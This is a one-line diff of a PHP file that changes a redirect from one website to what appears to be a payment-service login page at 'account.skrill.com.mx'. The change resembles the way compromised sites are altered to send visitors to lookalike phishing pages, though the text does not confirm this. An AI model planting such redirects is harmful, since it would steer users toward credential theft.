@@ -1,1 +1,1 @@
-<?php header("Location: http://idlprojects.com/"); die(); ?>
+<?php header("Location: https://account.skrill.com.mx/login/"); die(); ?>
